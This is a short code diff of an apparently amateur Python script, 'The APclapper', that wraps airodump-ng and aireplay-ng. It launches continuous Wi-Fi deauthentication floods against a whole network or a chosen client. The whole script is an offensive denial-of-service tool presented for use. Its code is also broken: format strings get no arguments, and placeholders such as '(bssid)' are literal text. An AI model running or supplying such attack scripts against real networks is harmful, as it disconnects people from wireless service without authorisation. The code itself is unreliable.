@@ -8,9 +8,9 @@ e = raw_input("enter the channel of the channel you wanna CLAP!:"))
 os.system("airodump-ng --channel %s --bssid %s wlan0mon")
 aireplay = raw_input("do you want to clap the entire network or just a client? Network/Client")
 if aireplay == 'Network':
-  os.system("aireplay-ng -0 0 -a  wlan0mon")
+  os.system("aireplay-ng -0 0 -a (bssid) wlan0mon")
 else:
-  aireplay_client = input("enter the client you wanna CLAP:")
+  aireplay_client = raw_input("enter the client you wanna CLAP:")
   os.system("aireplay-ng -0 0 -a (bssid) -c (aireplay_client) wlan0mon")
 
 print ("The APclapper...")
